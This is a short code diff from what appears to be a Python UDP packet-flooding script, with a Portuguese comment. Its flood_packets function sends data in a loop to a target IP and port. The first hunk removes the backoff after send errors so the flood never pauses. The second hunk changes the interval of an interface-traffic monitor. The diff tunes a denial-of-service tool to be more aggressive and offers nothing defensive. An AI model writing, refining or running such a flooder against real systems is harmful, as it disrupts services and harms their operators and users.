@@ -20,7 +20,7 @@ def flood_packets():
         try:
             sock.sendto(data, (TARGET_IP, TARGET_PORT))
         except:
-            time.sleep(0.1)
+            time.sleep(0.0)
 
 # === FUNÇÃO DE PING ===
 def get_ping(ip):
@@ -45,7 +45,7 @@ def monitor_iface():
     prev_sent = prev.bytes_sent
 
     while True:
-        time.sleep(1)
+        time.sleep(3)
         stats = psutil.net_io_counters(pernic=True).get(IFACE_NAME)
         curr_sent = stats.bytes_sent
         delta = curr_sent - prev_sent
